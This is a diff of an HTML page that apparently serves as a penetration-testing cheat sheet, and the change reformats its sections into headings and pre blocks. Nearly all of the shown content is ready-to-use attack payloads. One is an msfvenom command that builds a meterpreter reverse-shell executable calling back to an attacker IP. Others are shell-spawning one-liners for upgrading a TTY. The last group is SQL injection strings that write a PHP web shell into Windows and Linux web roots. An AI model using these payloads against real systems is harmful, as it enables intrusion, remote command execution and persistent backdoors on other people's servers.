@@ -58,22 +58,24 @@
             msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=445 -f exe -o shell_reverse.exe
             </pre>
 
-Interactive TTY Shell
-# python
-python -c 'import pty; pty.spawn("/bin/sh")'
-# Echo
-echo 'os.system('/bin/bash')'
-# sh
-/bin/sh -i
-# bash
-/bin/bash -i
+    <h3>Interactive TTY Shell</h3">
+            <pre style="font-size: medium;">
+            # python
+            python -c 'import pty; pty.spawn("/bin/sh")'
+            # Echo
+            echo 'os.system('/bin/bash')'
+            # sh
+            /bin/sh -i
+            # bash
+            /bin/bash -i
+            </pre>
 
------------------------------------------------------
-
-Shell From SQL Injection
-# windows
-?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
-# linux
-?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
+    <h3>Shell From SQL Injection</h3">
+        <pre style="font-size: medium;">
+            # windows
+            ?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
+            # linux
+            ?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
+        </pre>
 </body>
 </html>
